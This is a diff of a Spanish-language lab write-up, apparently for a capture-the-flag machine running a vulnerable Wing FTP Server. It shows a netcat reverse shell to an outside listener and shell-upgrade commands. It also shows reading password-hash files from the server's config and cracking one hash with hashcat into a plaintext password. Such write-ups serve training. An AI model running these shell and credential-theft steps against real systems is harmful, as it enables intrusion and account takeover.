@@ -96,19 +96,6 @@ cat /etc/passwd
 # usuarios relevantes: wingftp, wacky, root
 ```
 
-Archivos de configuración encontrados:
-
-```
-/opt/wingftp/Data/
-├── 1/
-├── _ADMINISTRATOR/
-│   ├── admins.xml      ← posibles credenciales del panel admin
-│   └── settings.xml
-├── bookmark_db
-├── settings.xml
-└── ssh_host_key
-```
-
 ---
 
 ## 5) Reverse shell
@@ -124,48 +111,88 @@ nc -lvnp 4444
 Payload ejecutado desde `Shell>`:
 
 ```bash
-nc 10.10.15.55 4444 -e /bin/sh
+nc 10.10.16.140 4444 -e /bin/sh
 ```
+<img width="687" height="207" alt="image" src="https://github.com/user-attachments/assets/c5685605-52c8-4e32-8c58-3b388d5c56e4" />
 
 Conexión recibida:
 
 ```
 connect to [10.10.15.55] from (UNKNOWN) [10.129.4.4] 49738
 ```
+<img width="560" height="439" alt="image" src="https://github.com/user-attachments/assets/cd1f4e13-482e-41c4-b101-ee8151c0ae15" />
 
+Para mejorar la Shell
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+```
 ---
+# 6) Búsqueda de credenciales
 
-## 6) Estado actual
-
-| Paso | Estado |
-|------|--------|
-| Identificar servicio vulnerable | ✅ |
-| Explotar CVE-2025-47812 | ✅ |
-| RCE como `wingftp` | ✅ |
-| Leer archivos de configuración | ⏳ |
-| Pivotar a usuario `wacky` | ⏳ |
-| Escalada a `root` | ⏳ |
-
----
-
-## 7) Próximos pasos
+Wing FTP Server almacena la configuración en `/opt/wftpserver/Data/`. Se exploró la estructura:
 
 ```bash
-# Leer credenciales del panel admin
-cat /opt/wingftp/Data/_ADMINISTRATOR/admins.xml
+ls /opt/wftpserver/Data/
+# 1  _ADMINISTRATOR  bookmark_db  settings.xml  ssh_host_ecdsa_key  ssh_host_key
+```
 
-# Enumerar SUID y capabilities
-find / -perm -4000 -type f 2>/dev/null
-/usr/sbin/getcap -r / 2>/dev/null
+### Hash del administrador del panel web
 
-# Revisar usuario wacky
-ls -la /home/wacky
-cat /home/wacky/user.txt
+```bash
+cat /opt/wftpserver/Data/_ADMINISTRATOR/admins.xml
+```
+
+```xml
+admin
+a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba
+```
+
+El panel admin corre en el **puerto 5466** (detectado en `settings.xml`), pero no es accesible externamente.
+
+### Usuarios FTP del servidor
+
+```bash
+ls /opt/wftpserver/Data/1/users/
+# anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
+
+cat /opt/wftpserver/Data/1/users/wacky.xml
+```
+
+```xml
+wacky
+32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
 ```
 
 ---
 
-## 8) Notas técnicas
+## 7) Crackeo del hash (wacky)
+
+El hash está en formato `sha256($pass.$salt)` donde el salt es la cadena fija **`WingFTP`**.
+
+```bash
+echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > hash.txt
+hashcat -m 1410 hash.txt rockyou.txt
+```
+
+Resultado:
+
+```
+32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
+Status: Cracked
+```
+
+| Usuario | Contraseña |
+|---------|-----------|
+| `wacky` | `!#7Blushing^*Bride5` |
+
+> **Nota:** El salt correcto es `WingFTP` (con mayúsculas exactas), no el nombre de usuario. Intentar con el username como salt agota rockyou sin resultado.
+
+---
+
+
+
+## 6) Notas técnicas
 
 - La shell del exploit es temporal — cada comando abre y cierra una sesión HTTP, lo que provoca `session expired` frecuentes.
 - El payload `bash -i >& /dev/tcp/...` falla porque zsh no soporta `/dev/tcp`. Usar `nc` o `python3` como alternativa.
